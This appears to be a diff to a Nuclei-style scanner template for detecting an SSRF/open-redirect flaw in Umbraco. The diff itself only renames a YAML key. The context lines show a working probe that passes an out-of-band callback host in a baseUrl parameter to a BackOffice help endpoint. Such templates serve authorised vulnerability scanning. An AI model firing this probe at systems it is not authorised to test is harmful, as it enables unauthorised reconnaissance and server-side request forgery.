@@ -12,7 +12,7 @@ info:
     cwe-id: CWE-601
   tags: ssrf,umbraco,oast
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}'
